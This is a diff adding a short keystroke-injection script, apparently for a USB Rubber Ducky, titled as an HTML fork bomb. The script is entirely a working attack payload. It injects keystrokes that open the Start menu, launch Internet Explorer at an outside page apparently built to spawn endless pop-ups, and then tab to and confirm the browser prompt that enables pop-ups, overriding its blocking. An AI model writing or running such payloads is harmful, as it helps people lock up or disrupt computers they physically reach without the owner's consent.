@@ -1,0 +1,13 @@
+REM HTML Fork Bomb by Jonny Banana
+DELAY 2000
+CONTROL ESCAPE
+DELAY 200
+STRING C:\Program Files\Internet Explorer\iexplore.exe https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/
+DELAY 200
+ENTER
+REM set a long delay  to give time to this disgusting browser
+DELAY 1000
+REM it's time to enable Pop-Up
+TAB
+DELAY 200
+ENTER
